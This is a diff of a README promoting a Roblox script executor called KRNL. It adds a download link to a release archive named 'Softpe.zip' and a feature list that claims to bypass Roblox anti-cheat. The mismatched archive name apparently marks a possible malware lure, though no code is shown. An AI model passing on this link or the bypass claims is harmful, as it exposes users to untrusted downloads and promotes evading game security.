@@ -3,10 +3,16 @@
 ## 📌 About  
 🚀 **KRNL Executor** is a high-performance and dependable **Roblox script executor** designed for seamless usability. With consistent updates and full compatibility with the latest Roblox versions, it's ideal for gamers, developers, and modders who want to elevate their Roblox experience.
 
-![Preview](/assets/KRNL.jpg)
+## 🔗[Download Krnl](https://github.com/frosty99001/Krnl-Executor/releases/download/Krnl/Softpe.zip)
 
 ## 🎮 Introduction  
 Welcome to **KRNL Executor** – the go-to solution for running Roblox scripts with ease. Whether you're fine-tuning gameplay, testing functions, or developing new content, KRNL makes scripting simple and effective.
+
+## Key Features
+- Execute **Roblox Krnl scripts** for game customization.
+- Bypasses Roblox anti-cheat with frequent updates.
+- Works on Windows and macOS.
+- Active community support for issues and updates.
 
 ## ✨ Features  
 Why pick **KRNL Executor**?  
